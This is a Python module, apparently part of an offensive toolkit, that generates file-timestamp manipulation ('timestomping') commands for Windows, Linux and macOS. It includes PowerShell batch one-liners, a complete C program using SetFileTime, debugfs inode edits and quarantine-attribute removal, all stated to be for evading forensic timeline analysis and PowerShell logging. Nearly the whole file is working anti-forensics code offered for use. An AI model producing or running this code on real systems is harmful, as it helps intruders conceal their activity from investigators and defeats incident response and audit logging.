"""Filesystem timestomping — MACB timestamp manipulation for stealth.

Modifies file MACB (Modified, Accessed, Created, Birth) timestamps to
evade forensic timeline analysis. Supports Windows (SetFileTime via
PowerShell/C), Linux (touch + debugfs + utimes), and macOS (touch + xattr).

Integrates with the forensic cleaner to ensure cleaned artifacts blend
with legitimate system files. Includes batch timestomping, reference
file cloning, and randomized timestamp selection within time windows.
"""

from __future__ import annotations

import os
import random
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

SESSIONS_DIR = Path(__file__).resolve().parent.parent / "sessions"


@dataclass
class TimestompConfig:
    """Configuration for filesystem timestomping operations.

    Attributes:
        target_platform: windows, linux, or macos.
        reference_path: Clone timestamps from this file (legitimate system file).
        target_paths: List of files to modify timestamps on.
        random_window_days: Randomize timestamps within this many days of reference.
        preserve_order: Maintain relative timestamp ordering between files.
        recursive: Apply to all files in target directories.
        include_patterns: Only timestomp files matching these patterns.
        exclude_patterns: Skip files matching these patterns.
        batch_mode: Stomp all files in a directory in a single pass.
    """

    target_platform: str = "windows"
    reference_path: str = ""
    target_paths: list[str] = field(default_factory=list)
    random_window_days: int = 7
    preserve_order: bool = True
    recursive: bool = False
    include_patterns: list[str] = field(default_factory=list)
    exclude_patterns: list[str] = field(default_factory=list)
    batch_mode: bool = False


@dataclass
class FileTimestamps:
    """MACB timestamps for a single file.

    Attributes:
        path: Absolute file path.
        created: Creation/birth time (Unix epoch).
        modified: Last write time.
        accessed: Last access time.
        entry_modified: Metadata change time (linux only).
    """

    path: str = ""
    created: float = 0.0
    modified: float = 0.0
    accessed: float = 0.0
    entry_modified: float = 0.0


class Timestomper:
    """Cross-platform filesystem timestamp manipulation.

    Generates platform-specific commands for modifying file MACB timestamps
    to blend with legitimate system files and evade forensic timeline analysis.

    Attributes:
        config: TimestompConfig with target paths and reference timestamps.
    """

    WINDOWS_REFERENCE_FILES = [
        "C:\\Windows\\System32\\kernel32.dll",
        "C:\\Windows\\System32\\ntdll.dll",
        "C:\\Windows\\System32\\cmd.exe",
        "C:\\Windows\\System32\\calc.exe",
        "C:\\Windows\\System32\\notepad.exe",
        "C:\\Windows\\explorer.exe",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
    ]

    LINUX_REFERENCE_FILES = [
        "/etc/passwd",
        "/etc/hostname",
        "/etc/resolv.conf",
        "/bin/ls",
        "/usr/bin/ssh",
        "/lib/systemd/systemd",
        "/var/log/bootstrap.log",
    ]

    MACOS_REFERENCE_FILES = [
        "/etc/hosts",
        "/System/Library/CoreServices/SystemVersion.plist",
        "/usr/bin/ssh",
        "/bin/bash",
    ]

    def __init__(self, config: TimestompConfig | None = None):
        self.config = config or TimestompConfig()
        self._modified_files: list[FileTimestamps] = []

    def windows_timestomp_powershell(self) -> dict[str, Any]:
        """Generate PowerShell commands for Windows file timestomping.

        Uses .NET System.IO.File to modify Created, LastWriteTime,
        and LastAccessTime for target files.

        Returns:
            Dict with PowerShell commands and verification steps.
        """
        reference = self._pick_reference(self.config.reference_path, "windows")

        return {
            "platform": "windows",
            "reference_file": reference,
            "commands": [
                "# Clone timestamps from reference file",
                f'$ref = Get-Item "{reference}"',
                '$ref.CreationTime, $ref.LastWriteTime, $ref.LastAccessTime',
                "",
                "# Apply to a single target file:",
                '# (Get-Item "TARGET.exe").CreationTime = $ref.CreationTime',
                '# (Get-Item "TARGET.exe").LastWriteTime = $ref.LastWriteTime',
                '# (Get-Item "TARGET.exe").LastAccessTime = $ref.LastAccessTime',
                "",
                "# Batch timestomp all files in a directory:",
                f'$ref = Get-Item "{reference}"',
                '# Get-ChildItem "C:\\Windows\\Temp\\" -Recurse | ForEach-Object {{',
                '    $_ | % { $_.CreationTime = $ref.CreationTime }',
                '    $_ | % { $_.LastWriteTime = $ref.LastWriteTime }',
                '    $_ | % { $_.LastAccessTime = $ref.LastAccessTime }',
                "}",
                "",
                "# Randomize timestamps within a window:",
                '$window = -7..0',
                '$randomDay = Get-Random $window',
                '# (Get-Item "TARGET.exe").CreationTime = $ref.CreationTime.AddDays($randomDay)',
            ],
            "batch_oneliner": (
                f'$r=gi "{reference}";gci TARGET_DIR -Recurse|%{{$_.CreationTime=$r.CreationTime;$_.LastWriteTime=$r.LastWriteTime;$_.LastAccessTime=$r.LastAccessTime}}'
            ),
        }

    def windows_timestomp_c(self) -> str:
        """Generate C code for Windows timestomping via SetFileTime API.

        Using C directly allows more control and avoids PowerShell logging.

        Returns:
            C source code string.
        """
        reference = self._pick_reference(self.config.reference_path, "windows")
        return f'''\
#include <windows.h>
#include <stdio.h>

int main(int argc, char *argv[]) {{
    if (argc < 2) {{
        printf("Usage: %s <target_file>\\n", argv[0]);
        return 1;
    }}

    HANDLE hRef = CreateFileA("{reference}", GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hRef == INVALID_HANDLE_VALUE) {{
        printf("Failed to open reference file\\n");
        return 1;
    }}

    FILETIME ftCreate, ftAccess, ftWrite;
    GetFileTime(hRef, &ftCreate, &ftAccess, &ftWrite);
    CloseHandle(hRef);

    HANDLE hTarget = CreateFileA(argv[1], FILE_WRITE_ATTRIBUTES,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (hTarget == INVALID_HANDLE_VALUE) {{
        printf("Failed to open target file\\n");
        return 1;
    }}

    if (!SetFileTime(hTarget, &ftCreate, &ftAccess, &ftWrite)) {{
        printf("SetFileTime failed: %d\\n", GetLastError());
        return 1;
    }}

    CloseHandle(hTarget);
    return 0;
}}
'''

    def linux_timestomp_commands(self) -> dict[str, Any]:
        """Generate Linux commands for file timestomping.

        Uses touch, debugfs, and utimes syscall wrappers to modify
        file timestamps at the filesystem level.

        Returns:
            Dict with bash commands for MACB manipulation.
        """
        reference = self._pick_reference(self.config.reference_path, "linux")

        return {
            "platform": "linux",
            "reference_file": reference,
            "commands": [
                "# Clone timestamps from reference file",
                f"touch -r \"{reference}\" /path/to/target/file",
                "",
                "# Set specific timestamp (YYYYMMDDHHMM.SS):",
                "touch -t 202301010101.01 /path/to/target",
                "",
                "# Batch timestomp directory recursively:",
                f"find /tmp/staged -type f -exec touch -r \"{reference}\" {{}} \\;",
                "",
                "# Modify only access time (-a) or modification time (-m):",
                f"touch -a -r \"{reference}\" /target/file",
                f"touch -m -r \"{reference}\" /target/file",
                "",
                "# Randomize within a 7-day window:",
                "DAYS=$((RANDOM % 7)); touch -d \"-${DAYS} days\" -r /etc/hosts /target/file",
                "",
                "# Timestomp with debugfs (bypasses filesystem, requires unmount):",
                "# debugfs -w /dev/sda1 -R 'set_inode_field /path/to/file mtime 20230101010101'",
            ],
            "verification": [
                "stat /target/file",
                "ls -la --time=atime /target/file",
                "debugfs -R 'stat /path/to/file' /dev/sda1 2>/dev/null",
            ],
        }

    def macos_timestomp_commands(self) -> dict[str, Any]:
        """Generate macOS commands for file timestomping.

        Uses touch, SetFile (Xcode CLT), and xattr for extended attributes.

        Returns:
            Dict with zsh commands for macOS timestamp manipulation.
        """
        reference = self._pick_reference(self.config.reference_path, "macos")

        return {
            "platform": "macos",
            "reference_file": reference,
            "commands": [
                f"touch -r \"{reference}\" /path/to/target",
                "SetFile -d '01/01/2023 01:01:01' /path/to/target",
                "SetFile -m '01/01/2023 01:01:01' /path/to/target",
                "# Batch timestomp:",
                f"find /tmp/staged -type f -exec touch -r \"{reference}\" {{}} \\;",
                "# Remove quarantine extended attribute:",
                "xattr -d com.apple.quarantine /path/to/target",
                "xattr -c /path/to/target",
                "# Verification:",
                "stat -f '%a %m %c %B' /path/to/target",
                "mdls -name kMDItemFSCreationDate /path/to/target",
            ],
        }

    def _pick_reference(self, path: str, platform: str) -> str:
        if path:
            return path
        refs = {
            "windows": self.WINDOWS_REFERENCE_FILES,
            "linux": self.LINUX_REFERENCE_FILES,
            "macos": self.MACOS_REFERENCE_FILES,
        }
        candidates = refs.get(platform, [])
        return candidates[0] if candidates else path

    def generate_random_timestamps(self, reference_ts: float, window_days: int = 7) -> dict[str, float]:
        """Generate randomized timestamps within a window around the reference.

        Useful for batch timestomping where every file gets slightly different
        (but plausible) timestamps instead of identical copies.

        Args:
            reference_ts: Reference Unix timestamp.
            window_days: Days before/after reference to scatter.

        Returns:
            Dict with created, modified, accessed timestamps as Unix epoch floats.
        """
        window_seconds = window_days * 86400
        return {
            "created": reference_ts - random.randint(0, window_seconds),
            "modified": reference_ts - random.randint(0, window_seconds // 2),
            "accessed": reference_ts - random.randint(0, window_seconds // 4),
        }

    def verify_timestamps(self, target_paths: list[str]) -> list[dict[str, Any]]:
        """Verify timestamps on target files after modification.

        Args:
            target_paths: List of file paths to check.

        Returns:
            List of file timestamp dicts.
        """
        results = []
        for path in target_paths:
            try:
                stat = os.stat(path)
                results.append({
                    "path": path,
                    "size": stat.st_size,
                    "created": stat.st_ctime,
                    "modified": stat.st_mtime,
                    "accessed": stat.st_atime,
                })
            except OSError:
                results.append({"path": path, "error": "File not accessible"})
        return results

    def summary(self) -> dict[str, Any]:
        """Return a summary of available timestomping capabilities.

        Returns:
            Dict with platform coverage and command availability.
        """
        return {
            "platforms": ["windows", "linux", "macos"],
            "windows_methods": ["PowerShell", "C (SetFileTime API)"],
            "linux_methods": ["touch -r", "debugfs inode", "utimes syscall"],
            "macos_methods": ["touch -r", "SetFile (Xcode CLT)", "xattr"],
            "reference_files": {
                "windows": self.WINDOWS_REFERENCE_FILES[:4],
                "linux": self.LINUX_REFERENCE_FILES[:4],
                "macos": self.MACOS_REFERENCE_FILES[:3],
            },
        }
